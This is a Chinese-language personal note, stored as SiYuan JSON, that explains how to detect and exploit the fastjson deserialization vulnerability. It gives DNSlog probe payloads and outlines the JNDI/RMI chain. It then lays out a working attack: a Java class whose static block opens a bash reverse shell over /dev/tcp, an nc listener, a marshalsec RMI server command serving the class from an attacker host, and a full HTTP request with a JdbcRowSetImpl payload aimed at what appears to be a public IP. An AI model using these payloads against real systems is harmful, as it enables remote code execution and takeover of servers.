{"ID":"20240921104048-y4vvxev","Spec":"1","Type":"NodeDocument","Properties":{"id":"20240921104048-y4vvxev","scroll":"\u0026#123;\u0026quot;rootId\u0026quot;:\u0026quot;20240921104048-y4vvxev\u0026quot;,\u0026quot;startId\u0026quot;:\u0026quot;20240921104049-1k67k0h\u0026quot;,\u0026quot;endId\u0026quot;:\u0026quot;20240921104094-on92gxi\u0026quot;,\u0026quot;scrollTop\u0026quot;:1100,\u0026quot;focusId\u0026quot;:\u0026quot;20240921104070-kxswciw\u0026quot;,\u0026quot;focusStart\u0026quot;:0,\u0026quot;focusEnd\u0026quot;:55\u0026#125;","title":"fastjson反序列化漏洞利用","updated":"20240921104063"},"Children":[{"ID":"20240921104049-1k67k0h","Type":"NodeHeading","HeadingLevel":2,"Properties":{"id":"20240921104049-1k67k0h","updated":"20240921104049"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"## ","Properties":{"id":""}},{"Type":"NodeText","Data":"fastjson"}]},{"ID":"20240921104050-frgdea2","Type":"NodeParagraph","Properties":{"id":"20240921104050-frgdea2","updated":"20240921104050"},"Children":[{"Type":"NodeText","Data":"是一个java的库，将java的对象转换为json字符串，也可以将json字符串转换为java对象；可以操作java中的对象；作用于对json格式的数据进行解析和打包"}]},{"ID":"20240921104051-v8jeswj","Type":"NodeParagraph","Properties":{"id":"20240921104051-v8jeswj","updated":"20240921104051"},"Children":[{"Type":"NodeText","Data":"{“aaa”:\"aaaa\"}"}]},{"ID":"20240921104052-p1vmd27","Type":"NodeHeading","HeadingLevel":2,"Properties":{"id":"20240921104052-p1vmd27","updated":"20240921104052"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"## ","Properties":{"id":""}},{"Type":"NodeText","Data":"反序列化漏洞"}]},{"ID":"20240921104053-z05hl07","Type":"NodeHeading","HeadingLevel":5,"Properties":{"id":"20240921104053-z05hl07","updated":"20240921104053"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"##### ","Properties":{"id":""}},{"Type":"NodeText","Data":"有哪些特征"}]},{"ID":"20240921104054-avxefsi","Type":"NodeParagraph","Properties":{"id":"20240921104054-avxefsi","updated":"20240921104054"},"Children":[{"Type":"NodeText","Data":"1、{“aaa”:\"aaaa\"}  再请求头里面，存在json类型的格式。"}]},{"ID":"20240921104055-e7ylov6","Type":"NodeParagraph","Properties":{"id":"20240921104055-e7ylov6","updated":"20240921104055"},"Children":[{"Type":"NodeText","Data":"2、构建报错。"}]},{"ID":"20240921104056-58ekg3u","Type":"NodeParagraph","Properties":{"id":"20240921104056-58ekg3u","updated":"20240921104056"},"Children":[{"Type":"NodeText","Data":"​\t\t1、抓包，请求包GET请求转换为POST请求"}]},{"ID":"20240921104057-a78zoz1","Type":"NodeParagraph","Properties":{"id":"20240921104057-a78zoz1","updated":"20240921104057"},"Children":[{"Type":"NodeText","Data":"​\t\t2、发送空的json内容"}]},{"ID":"20240921104058-m1lk1nr","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":3,"CodeBlockOpenFence":"YGBg","CodeBlockCloseFence":"YGBg","Properties":{"id":"20240921104058-m1lk1nr","updated":"20240921104058"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"{\n\n}\n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}}]},{"ID":"20240921104059-ru5240u","Type":"NodeParagraph","Properties":{"id":"20240921104059-ru5240u","updated":"20240921104059"},"Children":[{"Type":"NodeImage","Properties":{"id":""},"Children":[{"Type":"NodeBang","Data":"!","Properties":{"id":""}},{"Type":"NodeOpenBracket","Data":"[","Properties":{"id":""}},{"Type":"NodeLinkText","Data":"image-20240921093022661","Properties":{"id":""}},{"Type":"NodeCloseBracket","Data":"]","Properties":{"id":""}},{"Type":"NodeOpenParen","Data":"(","Properties":{"id":""}},{"Type":"NodeLinkDest","Data":"C:\\Users\\neo\\AppData\\Roaming\\Typora\\typora-user-images\\image-20240921093022661.png","Properties":{"id":""}},{"Type":"NodeCloseParen","Data":")","Properties":{"id":""}}]}]},{"ID":"20240921104060-i9ot37a","Type":"NodeParagraph","Properties":{"id":"20240921104060-i9ot37a","updated":"20240921104060"},"Children":[{"Type":"NodeText","Data":"3、发送一半的"}]},{"ID":"20240921104061-c9dsth0","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":3,"CodeBlockOpenFence":"YGBg","CodeBlockCloseFence":"YGBg","Properties":{"id":"20240921104061-c9dsth0","updated":"20240921104061"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"{\n\t\"name\":\"znangsan\"\n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}}]},{"ID":"20240921104062-zctyxup","Type":"NodeParagraph","Properties":{"id":"20240921104062-zctyxup","updated":"20240921104062"},"Children":[{"Type":"NodeText","Data":"​\t\t4、content-type:application/xxx-----\u003econtent-type:application/json"}]},{"ID":"20240921104063-6vtn429","Type":"NodeParagraph","Properties":{"id":"20240921104063-6vtn429","updated":"20240921104063"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Properties":{"parent-style":"width: 186px;","style":"width: 176px;"},"Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image-20240921092920570"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"C:\\Users\\neo\\AppData\\Roaming\\Typora\\typora-user-images\\image-20240921092920570.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"width: 176px;\" parent-style=\"width: 186px;\"}"},{"Type":"NodeText","Data":"​"}]},{"ID":"20240921104064-exzg1p1","Type":"NodeParagraph","Properties":{"id":"20240921104064-exzg1p1","updated":"20240921104064"},"Children":[{"Type":"NodeText","Data":"4、dnslog检测"}]},{"ID":"20240921104065-rexzgbm","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":3,"CodeBlockOpenFence":"YGBg","CodeBlockCloseFence":"YGBg","Properties":{"id":"20240921104065-rexzgbm","updated":"20240921104065"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"{\"name\":{\"@type\":\"java.net.Inet4Address\",\"val\":\"dnslog.\"}}   #1.2.67版本之前可用\n\n#1.2.67版本之后可用\n{\"@type\":\"java.net.Inet4Address\",\"val\":\"dnslog.\"}\n{\"@type\":\"java.net.Inet6Address\",\"val\":\"dnslog.\"}\n\n#畸形payload-----不知道版本，做盲打\n{\"@type\":\"java.net.InetSocketddress\"{\"address\":,\"var\":\"dnslog\"}}\n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}}]},{"ID":"20240921104066-xnvhy78","Type":"NodeParagraph","Properties":{"id":"20240921104066-xnvhy78","updated":"20240921104066"},"Children":[{"Type":"NodeImage","Properties":{"id":""},"Children":[{"Type":"NodeBang","Data":"!","Properties":{"id":""}},{"Type":"NodeOpenBracket","Data":"[","Properties":{"id":""}},{"Type":"NodeLinkText","Data":"image-20240921093422454","Properties":{"id":""}},{"Type":"NodeCloseBracket","Data":"]","Properties":{"id":""}},{"Type":"NodeOpenParen","Data":"(","Properties":{"id":""}},{"Type":"NodeLinkDest","Data":"C:\\Users\\neo\\AppData\\Roaming\\Typora\\typora-user-images\\image-20240921093422454.png","Properties":{"id":""}},{"Type":"NodeCloseParen","Data":")","Properties":{"id":""}}]}]},{"ID":"20240921104067-ua83p7k","Type":"NodeParagraph","Properties":{"id":"20240921104067-ua83p7k","updated":"20240921104067"},"Children":[{"Type":"NodeText","Data":"批量的工具："}]},{"ID":"20240921104068-0korjpk","Type":"NodeParagraph","Properties":{"id":"20240921104068-0korjpk","updated":"20240921104068"},"Children":[{"Type":"NodeText","Data":"https://github.com/smallfox233/JsonExp"}]},{"ID":"20240921104069-n0bfrmz","Type":"NodeHeading","HeadingLevel":5,"Properties":{"id":"20240921104069-n0bfrmz","updated":"20240921104069"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"##### ","Properties":{"id":""}},{"Type":"NodeText","Data":"漏洞原理"}]},{"ID":"20240921104070-kxswciw","Type":"NodeParagraph","Properties":{"id":"20240921104070-kxswciw","updated":"20240921104070"},"Children":[{"Type":"NodeText","Data":"通过autotype实例化类，并调用类的set/get方法区访问属性。默认使用@type来指定反序列化的任意类"}]},{"ID":"20240921104071-hviebh3","Type":"NodeParagraph","Properties":{"id":"20240921104071-hviebh3","updated":"20240921104071"},"Children":[{"Type":"NodeText","Data":"格式：{“@type”:\"实例化类的类名\"，“”：“”}，构造这里调用的类的方法（定义恶意的类），对成员目标的变量注入达到传参的目的，形成最终的恶意调用链。"}]},{"ID":"20240921104072-9s5zxuw","Type":"NodeHeading","HeadingLevel":5,"Properties":{"id":"20240921104072-9s5zxuw","updated":"20240921104072"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"##### ","Properties":{"id":""}},{"Type":"NodeText","Data":"利用流程"}]},{"ID":"20240921104073-cnf4l9z","Type":"NodeParagraph","Properties":{"id":"20240921104073-cnf4l9z","updated":"20240921104073"},"Children":[{"Type":"NodeText","Data":"1、创建一个恶意的类，调用（在我自己的web服务中存放这个恶意类的文件）"}]},{"ID":"20240921104074-ir8igq0","Type":"NodeParagraph","Properties":{"id":"20240921104074-ir8igq0","updated":"20240921104074"},"Children":[{"Type":"NodeText","Data":"2、开启RMI服务（在我们攻击机开启，指定一个端口；同时开启rmi服务的java版本要支持rmi服务）"}]},{"ID":"20240921104075-t5ilk69","Type":"NodeParagraph","Properties":{"id":"20240921104075-t5ilk69","updated":"20240921104075"},"Children":[{"Type":"NodeText","Data":"3、需要rmi服务返回referenceWrapper类"}]},{"ID":"20240921104076-ppeejpm","Type":"NodeParagraph","Properties":{"id":"20240921104076-ppeejpm","updated":"20240921104076"},"Children":[{"Type":"NodeText","Data":"4、目标（JNDI_Client）在执行lookup操作的时候，在decodeObject中将ReferenceWrapper变成Reference类，然后远程加载并实例化我们的Factory类（即远程加载我们HTTP服务器上的恶意类），在实例化时触发静态代码片段中的恶意代码"}]},{"ID":"20240921104077-t9putmc","Type":"NodeHeading","HeadingLevel":4,"Properties":{"id":"20240921104077-t9putmc","updated":"20240921104077"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"#### ","Properties":{"id":""}},{"Type":"NodeText","Data":"攻击过程"}]},{"ID":"20240921104078-l64rw33","Type":"NodeParagraph","Properties":{"id":"20240921104078-l64rw33","updated":"20240921104078"},"Children":[{"Type":"NodeText","Data":"1、恶意类的内容  .java --\u003e  .class"}]},{"ID":"20240921104079-lg4ibgw","Type":"NodeParagraph","Properties":{"id":"20240921104079-lg4ibgw","updated":"20240921104079"},"Children":[{"Type":"NodeText","Data":"fastjsonshell.java    ----》    fastjsonshell.class"}]},{"ID":"20240921104080-3t314sc","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":3,"CodeBlockOpenFence":"YGBg","CodeBlockCloseFence":"YGBg","Properties":{"id":"20240921104080-3t314sc","updated":"20240921104080"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"import java.lang.Runtime;\nimport java.lang.Process;\npublic class fastjsonshell{\n static {\n try {\n Runtime rt = Runtime.getRuntime();\n //String[] commands = {\"\", \"\"};\n String[] commands = {\"/bin/bash\",\"-c\",\"bash -i \u003e\u0026 /dev/tcp/IP/port 0\u003e1\u0026\"};\n//反弹shell命令\n Process pc = rt.exec(commands);\n pc.waitFor();\n } catch (Exception e) {\n // do nothing\n }\n }\n}\n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}}]},{"ID":"20240921104081-e7gwt2i","Type":"NodeParagraph","Properties":{"id":"20240921104081-e7gwt2i","updated":"20240921104081"},"Children":[{"Type":"NodeText","Data":"编译注意java环境"}]},{"ID":"20240921104082-4es1vu3","Type":"NodeParagraph","Properties":{"id":"20240921104082-4es1vu3","updated":"20240921104082"},"Children":[{"Type":"NodeImage","Properties":{"id":""},"Children":[{"Type":"NodeBang","Data":"!","Properties":{"id":""}},{"Type":"NodeOpenBracket","Data":"[","Properties":{"id":""}},{"Type":"NodeLinkText","Data":"image-20240921100048116","Properties":{"id":""}},{"Type":"NodeCloseBracket","Data":"]","Properties":{"id":""}},{"Type":"NodeOpenParen","Data":"(","Properties":{"id":""}},{"Type":"NodeLinkDest","Data":"C:\\Users\\neo\\AppData\\Roaming\\Typora\\typora-user-images\\image-20240921100048116.png","Properties":{"id":""}},{"Type":"NodeCloseParen","Data":")","Properties":{"id":""}}]}]},{"ID":"20240921104083-2ujpnyw","Type":"NodeParagraph","Properties":{"id":"20240921104083-2ujpnyw","updated":"20240921104083"},"Children":[{"Type":"NodeText","Data":"2、开启http服务共享我们恶意类文件"}]},{"ID":"20240921104084-s3jhqzb","Type":"NodeParagraph","Properties":{"id":"20240921104084-s3jhqzb","updated":"20240921104084"},"Children":[{"Type":"NodeImage","Properties":{"id":""},"Children":[{"Type":"NodeBang","Data":"!","Properties":{"id":""}},{"Type":"NodeOpenBracket","Data":"[","Properties":{"id":""}},{"Type":"NodeLinkText","Data":"image-20240921100223634","Properties":{"id":""}},{"Type":"NodeCloseBracket","Data":"]","Properties":{"id":""}},{"Type":"NodeOpenParen","Data":"(","Properties":{"id":""}},{"Type":"NodeLinkDest","Data":"C:\\Users\\neo\\AppData\\Roaming\\Typora\\typora-user-images\\image-20240921100223634.png","Properties":{"id":""}},{"Type":"NodeCloseParen","Data":")","Properties":{"id":""}}]}]},{"ID":"20240921104085-fnly8im","Type":"NodeParagraph","Properties":{"id":"20240921104085-fnly8im","updated":"20240921104085"},"Children":[{"Type":"NodeText","Data":"3、（反弹shell时需要做监听，写文件就不需要这一步）"}]},{"ID":"20240921104086-tme4b7v","Type":"NodeParagraph","Properties":{"id":"20240921104086-tme4b7v","updated":"20240921104086"},"Children":[{"Type":"NodeText","Data":"nc -lvvp 8888"}]},{"ID":"20240921104087-eohrwo3","Type":"NodeParagraph","Properties":{"id":"20240921104087-eohrwo3","updated":"20240921104087"},"Children":[{"Type":"NodeText","Data":"4、开启rmi服务"}]},{"ID":"20240921104088-kw8qx7j","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":3,"CodeBlockOpenFence":"YGBg","CodeBlockCloseFence":"YGBg","Properties":{"id":"20240921104088-kw8qx7j","updated":"20240921104088"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer \"http://192.168.188.128:8000/#fastjsonshell\" 8989\n\n\n#\"http://192.168.188.128:8000/#fastjsonshell\"   第一步生成恶意类的地址\n#8989  在本地开启的rmi服务端口   192.168.188.128:8989 \n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}}]},{"ID":"20240921104089-p5d7o6c","Type":"NodeParagraph","Properties":{"id":"20240921104089-p5d7o6c","updated":"20240921104089"},"Children":[{"Type":"NodeText","Data":"5、payload"}]},{"ID":"20240921104090-n1l4s7a","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":3,"CodeBlockOpenFence":"YGBg","CodeBlockCloseFence":"YGBg","Properties":{"id":"20240921104090-n1l4s7a","updated":"20240921104090"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"POST / HTTP/1.1\nHost: 113.45.183.4:23548\nUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.6; AOLBuild 4340.130; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30618)\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests: 1\nPriority: u=0, i\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 58\n\n{\n\t\"name\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n\t\"dataSourceName\":\"rmi://192.168.188.128:8989/fastjsonshell\",\n\t\"autoCommit\":true\t\n}\n}\n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}}]},{"ID":"20240921104091-etba4aw","Type":"NodeParagraph","Properties":{"id":"20240921104091-etba4aw","updated":"20240921104091"},"Children":[{"Type":"NodeText","Data":"有几个坑点："}]},{"ID":"20240921104092-m3h3s30","Type":"NodeParagraph","Properties":{"id":"20240921104092-m3h3s30","updated":"20240921104092"},"Children":[{"Type":"NodeText","Data":"1、jdk版本要再8u122之前才能开启rmi服务，之后的版本rmi服务被关掉了"}]},{"ID":"20240921104093-zmf17zd","Type":"NodeParagraph","Properties":{"id":"20240921104093-zmf17zd","updated":"20240921104093"},"Children":[{"Type":"NodeText","Data":"2、恶意类的内容先进行简单命令，最后再fantanshell"}]},{"ID":"20240921104094-on92gxi","Type":"NodeParagraph","Properties":{"id":"20240921104094-on92gxi","updated":"20240921104094"},"Children":[{"Type":"NodeText","Data":"3、内网靶场要攻击机和靶机网络互通。"}]}]}